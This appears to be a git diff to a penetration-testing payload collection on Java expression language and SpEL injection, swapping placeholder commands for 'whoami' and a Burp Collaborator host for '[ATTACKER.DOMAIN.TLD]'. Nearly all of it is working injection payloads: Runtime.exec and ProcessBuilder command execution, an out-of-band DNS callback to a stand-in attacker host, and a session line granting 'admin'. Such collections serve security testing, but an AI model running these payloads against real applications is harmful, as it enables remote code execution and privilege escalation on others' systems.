@@ -397,7 +397,7 @@ ${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().ex
 DNS lookup
 
 ```java
-${"".getClass().forName("java.net.InetAddress").getMethod("getByName","".getClass()).invoke("","xxxxxxxxxxxxxx.burpcollaborator.net")}
+${"".getClass().forName("java.net.InetAddress").getMethod("getByName","".getClass()).invoke("","[ATTACKER.DOMAIN.TLD]")}
 ```
 
 ### SpEL - Session Attributes
@@ -413,7 +413,7 @@ ${pageContext.request.getSession().setAttribute("admin",true)}
 - Method using `java.lang.Runtime` #1 - accessed with JavaClass
 
     ```java
-    ${T(java.lang.Runtime).getRuntime().exec("COMMAND_HERE")}
+    ${T(java.lang.Runtime).getRuntime().exec("whoami")}
     ```
 
 - Method using `java.lang.Runtime` #2
@@ -427,13 +427,13 @@ ${pageContext.request.getSession().setAttribute("admin",true)}
 - Method using `java.lang.Runtime` #3 - accessed with `invoke`
 
     ```java
-    ${''.getClass().forName('java.lang.Runtime').getMethods()[6].invoke(''.getClass().forName('java.lang.Runtime')).exec('COMMAND_HERE')}
+    ${''.getClass().forName('java.lang.Runtime').getMethods()[6].invoke(''.getClass().forName('java.lang.Runtime')).exec('whoami')}
     ```
 
 - Method using `java.lang.Runtime` #3 - accessed with `javax.script.ScriptEngineManager`
 
     ```java
-    ${request.getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("js").eval("java.lang.Runtime.getRuntime().exec(\\\"ping x.x.x.x\\\")"))}
+    ${request.getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("js").eval("java.lang.Runtime.getRuntime().exec(\\\"whoami\\\")"))}
     ```
 
 - Method using `java.lang.ProcessBuilder`
@@ -442,7 +442,7 @@ ${pageContext.request.getSession().setAttribute("admin",true)}
     ${request.setAttribute("c","".getClass().forName("java.util.ArrayList").newInstance())}
     ${request.getAttribute("c").add("cmd.exe")}
     ${request.getAttribute("c").add("/k")}
-    ${request.getAttribute("c").add("ping x.x.x.x")}
+    ${request.getAttribute("c").add("whoami")}
     ${request.setAttribute("a","".getClass().forName("java.lang.ProcessBuilder").getDeclaredConstructors()[0].newInstance(request.getAttribute("c")).start())}
     ${request.getAttribute("a")}
     ```
